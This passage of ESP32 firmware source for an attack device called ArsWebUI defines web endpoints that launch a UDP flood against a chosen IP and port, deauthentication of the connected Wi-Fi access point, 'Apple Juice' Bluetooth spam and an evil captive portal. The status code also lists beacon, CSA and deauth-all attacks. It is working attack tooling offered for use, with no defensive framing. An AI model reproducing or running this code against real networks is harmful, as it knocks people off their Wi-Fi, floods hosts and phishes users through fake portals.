  server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    deauthRunning = false;
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
      stopRequested = true; xSemaphoreGive(attackMutex);
    }
    r->send(200,"text/plain","Deauth stop requested");
  });

  // ── UDP FLOOD ─────────────────────────────────────────────────────────────
  server.on("/udp_flood", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("ip") || !r->hasParam("port")) {
      r->send(400,"text/plain","ERROR: ip+port required"); return;
    }
    String ip   = r->getParam("ip")->value();
    int    port = r->getParam("port")->value().toInt();
    if (!validateIP(ip))     { r->send(400,"text/plain","ERROR: Bad IP");   return; }
    if (!validatePort(port)) { r->send(400,"text/plain","ERROR: Bad port"); return; }

    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    targetIP   = ip;
    targetPort = (uint16_t)port;
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    xTaskCreatePinnedToCore(udp_flood_task, "udpf", 4096, NULL, 2,
                            &udpTaskHandle, 0);
    r->send(200,"text/plain","UDP flood started");
  });

  // ── STATUS / INFO ENDPOINTS ───────────────────────────────────────────────
  server.on("/pkt_count", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(200,"text/plain", String(packetsSent));
  });

  server.on("/attack_status", HTTP_GET, [](AsyncWebServerRequest* r) {
    String type = "idle";
    if (deauthRunning)           type = "deauth";
    else if (attackRunning && beaconTaskHandle) type = "beacon";
    else if (attackRunning && csaTaskHandle)    type = "csa";
    else if (attackRunning && udpTaskHandle)    type = "udpflood";
    else if (attackRunning && deauthAllTaskHandle) type = "deauthall";
    else if (attackRunning && deauthAllChHandle)   type = "deauthallch";
    else if (ajRunning)          type = "applejuice";
    else if (portalRunning)      type = "portal";
    r->send(200, "text/plain",
      String(attackRunning || ajRunning || portalRunning ? 1 : 0)
      + "," + type + "," + String(packetsSent));
  });

  server.on("/log", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!logMutex) { r->send(200,"text/plain","(log not ready)"); return; }
    if (xSemaphoreTake(logMutex, pdMS_TO_TICKS(200)) != pdTRUE) {
      r->send(503,"text/plain","mutex"); return;
    }
    String out;
    int start = (logCount < LOG_MAX) ? 0 : logHead;
    for (int i = 0; i < logCount; i++) {
      int idx = (start + i) % LOG_MAX;
      out += String(logBuf[idx].ts / 1000) + "s  " + logBuf[idx].msg + "\n";
    }
    xSemaphoreGive(logMutex);
    r->send(200,"text/plain", out);
  });

  server.on("/sysinfo", HTTP_GET, [](AsyncWebServerRequest* r) {
    char buf[512];
    snprintf(buf, sizeof(buf),
      "<div class='stats'>"
      "<div class='stat'><div class='stat-l'>UPTIME</div><div class='stat-v'>%lus</div></div>"
      "<div class='stat'><div class='stat-l'>HEAP</div><div class='stat-v'>%uB</div></div>"
      "<div class='stat'><div class='stat-l'>PSRAM</div><div class='stat-v'>%uB</div></div>"
      "<div class='stat'><div class='stat-l'>PKTS</div><div class='stat-v'>%lu</div></div>"
      "<div class='stat'><div class='stat-l'>CLIENTS</div><div class='stat-v'>%d</div></div>"
      "<div class='stat'><div class='stat-l'>PORTAL</div><div class='stat-v'>%s</div></div>"
      "</div>",
      millis()/1000,
      (unsigned)ESP.getFreeHeap(),
      (unsigned)ESP.getFreePsram(),
      packetsSent,
      numClients,
      portalRunning ? "ON" : "OFF");
    r->send(200,"text/html",buf);
  });

  server.on("/ota_info", HTTP_GET, [](AsyncWebServerRequest* r) {
    String webIP  = WiFi.softAPIP().toString();
    String otaIP  = client_connected ? client_ip : webIP;
    r->send(200, "text/plain", webIP + "," + otaIP + ":" + String(OTA_PORT));
  });

  // ── CONFIG ENDPOINTS ──────────────────────────────────────────────────────
  server.on("/savesta", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("ssid")) { r->send(400,"text/plain","ERROR: ssid required"); return; }
    String ss = r->getParam("ssid")->value();
    String pp = r->hasParam("pass") ? r->getParam("pass")->value() : "";
    if (ss.length() == 0 || ss.length() > 32) { r->send(400,"text/plain","ERROR: Bad SSID"); return; }
    prefs.putString("client_ssid", ss);
    prefs.putString("client_pass", pp);
    ss.toCharArray(client_ssid, 64);
    pp.toCharArray(client_pass, 64);
    WiFi.begin(client_ssid, client_pass);
    logEvent("STA connecting: %s", client_ssid);
    r->send(200,"text/plain","STA connecting: " + ss);
  });

  // ── STA STATUS POLL ──────────────────────────────────────────────────────────
  // Returns: "connecting", "connected,<IP>", or "disconnected"
  server.on("/sta_status", HTTP_GET, [](AsyncWebServerRequest* r) {
    wl_status_t ws = WiFi.status();
    if (ws == WL_CONNECTED) {
      String ip = WiFi.localIP().toString();
      r->send(200, "text/plain", "connected," + ip);
    } else if (ws == WL_CONNECT_FAILED || ws == WL_NO_SSID_AVAIL || ws == WL_CONNECTION_LOST) {
      r->send(200, "text/plain", "failed");
    } else {
      r->send(200, "text/plain", "connecting");
    }
  });

  // ── DEAUTH CONNECTED WIFI ────────────────────────────────────────────────────
  // Deauths the AP that the STA interface is currently connected to.
  // Resolves BSSID + channel from WiFi driver — works even on Piso WiFi vendors.
  server.on("/deauth_connected", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (WiFi.status() != WL_CONNECTED) {
      r->send(400, "text/plain", "ERROR: STA not connected"); return;
    }
    // Pull live BSSID + channel from the STA association
    uint8_t* liveBSSID = WiFi.BSSID();
    int      liveCh    = WiFi.channel();
    if (!liveBSSID || !validateChannel(liveCh)) {
      r->send(400, "text/plain", "ERROR: Could not resolve connected AP info"); return;
    }
    char bstr[18];
    snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      liveBSSID[0],liveBSSID[1],liveBSSID[2],
      liveBSSID[3],liveBSSID[4],liveBSSID[5]);
    if (isOwnAP(NULL, bstr)) {
      r->send(403, "text/plain", "ERROR: Own AP"); return;
    }
    if (r->hasParam("inten")) {
      int v = r->getParam("inten")->value().toInt();
      if      (v == 1) intensity = INTENSITY_LOW;
      else if (v == 2) intensity = INTENSITY_MED;
      else if (v == 3) intensity = INTENSITY_HIGH;
      else if (v == 4) intensity = INTENSITY_MAX;
    }
    memcpy(targetBSSID, liveBSSID, 6);
    memset(targetClient, 0, 6);
    targetChannel = liveCh;
    targetSSID    = WiFi.SSID();

    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (deauthRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Already running"); return;
    }
    deauthRunning = attackRunning = true;
    stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    pausePromiscForTX();
    BaseType_t ok = xTaskCreatePinnedToCore(deauthTask, "deauth_conn", 10240, NULL, 3,
                            &deauthTaskHandle, 0);
    if (ok != pdPASS) {
      deauthRunning = attackRunning = false;
      deauthTaskHandle = NULL;
      setLedState(LS_GREEN);
      r->send(500, "text/plain", "ERROR: task create failed"); return;
    }
    logEvent("Deauth CONNECTED: %s ch%d", bstr, liveCh);
    r->send(200, "text/plain", String("OK deauth connected: ") + bstr + " ch" + liveCh);
  });

  server.on("/setap", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("ssid") || !r->hasParam("pass")) {
      r->send(400,"text/plain","ERROR: ssid+pass required"); return;
    }
    String ss = r->getParam("ssid")->value();
    String pp = r->getParam("pass")->value();
    if (ss.length() == 0 || ss.length() > 32) { r->send(400,"text/plain","ERROR: Bad SSID"); return; }
    if (pp.length() < 8 || pp.length() > 63)  { r->send(400,"text/plain","ERROR: Bad pass"); return; }
    prefs.putString("ap_ssid", ss);
    prefs.putString("ap_pass", pp);
    logEvent("AP rename → %s (restarting)", ss.c_str());
    r->send(200,"text/plain","AP renamed. Reconnect to: " + ss);
    delay(200);
    ESP.restart();
  });

  server.on("/set", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (r->hasParam("macrand")) {
      macRandEnabled = r->getParam("macrand")->value() == "1";
      logEvent("MAC rand: %s", macRandEnabled ? "ON" : "OFF");
    }
    r->send(200,"text/plain","OK");
  });

  server.on("/setotapass", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("pass")) { r->send(400,"text/plain","ERROR: pass required"); return; }
    String p = r->getParam("pass")->value();
    if (p.length() < 4) { r->send(400,"text/plain","ERROR: pass too short"); return; }
    prefs.putString("ota_pass", p);
    logEvent("OTA pass changed");
    r->send(200,"text/plain","OTA pass updated — reboot to apply");
  });

  // ── APPLE JUICE ───────────────────────────────────────────────────────────
  server.on("/applejuice", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    xTaskCreatePinnedToCore(applejuice_task, "apj", 6144, NULL, 2,
                            &applejuiceTaskHandle, 0);
    r->send(200,"text/plain","Apple Juice started");
  });

  server.on("/applejuice_stop", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    stopAppleJuice();
    r->send(200,"text/plain","Apple Juice stopped");
  });

  // ── CAPTIVE DNS FALLBACK (main AP not portal) ─────────────────────────────
  server.onNotFound([](AsyncWebServerRequest* r) {
    if (portalRunning) {
      r->redirect("/captive");
    } else {
      r->redirect("/");
    }
  });
}

// ─── SETUP ───────────────────────────────────────────────────────────────────
void setup() {
  Serial0.begin(115200);
  delay(200);
  Serial0.println("\n==========================================");
  Serial0.println("  ArsWebUI v5.0 — MARAUDER + APPLE JUICE + EVIL PORTAL + CONNECTED ATTACK");
  Serial0.println("==========================================\n");

  led.begin();
  led.setBrightness(80);
  led.clear();
  led.show();
  delay(10);
  setLedState(LS_BLUE);
  updateLED();

  attackMutex  = xSemaphoreCreateMutex();
  clientsMutex = xSemaphoreCreateMutex();
  logMutex     = xSemaphoreCreateMutex();
  credsMutex   = xSemaphoreCreateMutex();
  if (!attackMutex || !clientsMutex || !logMutex || !credsMutex) {
    Serial0.println("[FATAL] Mutex init failed");
    setLedState(LS_RED); updateLED();
    while (1) delay(1000);
  }

  psramAvailable = psramFound();
  if (psramAvailable) {
    psramTargets = (DeauthTarget*)heap_caps_malloc(
      sizeof(DeauthTarget) * MAX_PSRAM_TARGETS, MALLOC_CAP_SPIRAM);
    if (!psramTargets) psramAvailable = false;
  }
  INFO("PSRAM: %s (%u bytes free SPIRAM)",
       psramAvailable ? "OK" : "NONE/HEAP",
       (unsigned)ESP.getFreePsram());

  esp_err_t nvs = nvs_flash_init();
  if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    nvs_flash_erase(); nvs_flash_init();
  }
  prefs.begin("arsweb", false);

  // Country code
  {
    wifi_country_t cc;
    memset(&cc, 0, sizeof(cc));
    cc.cc[0] = 'P'; cc.cc[1] = 'H'; cc.cc[2] = '\0';
    cc.schan        = 1;
    cc.nchan        = 13;
    cc.max_tx_power = 20;
    cc.policy       = WIFI_COUNTRY_POLICY_MANUAL;
    esp_wifi_set_country(&cc);
  }

  WiFi.persistent(false);
  WiFi.mode(WIFI_OFF);
  delay(200);
  WiFi.mode(WIFI_AP_STA);
  delay(300);

  {
    wifi_country_t cc;
    memset(&cc, 0, sizeof(cc));
    cc.cc[0] = 'P'; cc.cc[1] = 'H'; cc.cc[2] = '\0';
    cc.schan        = 1;
    cc.nchan        = 13;
    cc.max_tx_power = 20;
    cc.policy       = WIFI_COUNTRY_POLICY_MANUAL;
    esp_wifi_set_country(&cc);
  }

  String apSSID = prefs.getString("ap_ssid", AP_SSID_DEFAULT);
  String apPass = prefs.getString("ap_pass", AP_PASS_DEFAULT);
  if (apSSID.length() == 0 || apSSID.length() > 32) apSSID = AP_SSID_DEFAULT;
  if (apPass.length() < 8 || apPass.length() > 63) apPass = AP_PASS_DEFAULT;

  bool apOk = false;
  for (int attempt = 0; attempt < 8 && !apOk; attempt++) {
    apOk = WiFi.softAP(apSSID.c_str(), apPass.c_str(), AP_CHANNEL, 0, 4);
    if (!apOk) {
      delay(400);
      WiFi.mode(WIFI_OFF); delay(150);
      WiFi.mode(WIFI_AP_STA); delay(250);
    }
  }
  if (!apOk) apOk = WiFi.softAP("ArsWebUI-OPEN", NULL, AP_CHANNEL, 0, 4);
  if (!apOk) {
    Serial0.println("[FATAL] softAP failed");
    setLedState(LS_RED); updateLED();
    while (1) { updateLED(); delay(500); }
  }
  delay(300);

  WiFi.softAPmacAddress(ownBSSIDap);
  WiFi.macAddress(ownBSSID);

  boostTxPower();
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  delay(30);

  startPromiscuous();

  String cs = prefs.getString("client_ssid", "");
  if (cs.length() > 0) {
    String cp = prefs.getString("client_pass", "");
    cs.toCharArray(client_ssid, 64);
    cp.toCharArray(client_pass, 64);
    WiFi.begin(client_ssid, client_pass);
  }

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  setupServer();
  server.begin();

  {
    String otaPass = prefs.getString("ota_pass", OTA_PASS_DEFAULT);
    ArduinoOTA.setHostname("ArsWebUI");
    ArduinoOTA.setPassword(otaPass.c_str());
    ArduinoOTA.setPort(OTA_PORT);
    ArduinoOTA.onStart([]() {
      stopAllAttacks();
      stopPromiscuous();
      setLedState(LS_YELLOW);
    });
    ArduinoOTA.onEnd([]() { setLedState(LS_GREEN); });
    ArduinoOTA.onError([](ota_error_t e) {
      logEvent("OTA error %u", (unsigned)e);
      setLedState(LS_RED);
    });
    ArduinoOTA.begin();
  }

  logEvent("Boot OK — v5.0. AP:%s Heap:%u PSRAM:%s",
    apSSID.c_str(), ESP.getFreeHeap(),
    psramAvailable ? "YES" : "NO");

  Serial0.printf("[INFO] Web UI: http://%s\n", WiFi.softAPIP().toString().c_str());
  setLedState(LS_GREEN);
}

// ─── LOOP ────────────────────────────────────────────────────────────────────
void loop() {
  // Always process main AP's DNS
  if (!portalRunning) dnsServer.processNextRequest();
  // Portal DNS handled by portalDns — runs in same task, no separate handle needed
  if (portalRunning)  portalDns.processNextRequest();

  ArduinoOTA.handle();
  updateLED();

  static unsigned long lastCheck = 0;
  if (millis() - lastCheck > 5000) {
    lastCheck = millis();
    const bool nowConn = (WiFi.status() == WL_CONNECTED);
    if (nowConn && !client_connected) {
      client_connected = true;
      client_ip = WiFi.localIP().toString();
      logEvent("STA up: %s  RSSI:%d dBm", client_ip.c_str(), WiFi.RSSI());
    } else if (!nowConn && client_connected) {
      client_connected = false;
      logEvent("STA disconnected");
    }
  }

  delay(5);
}
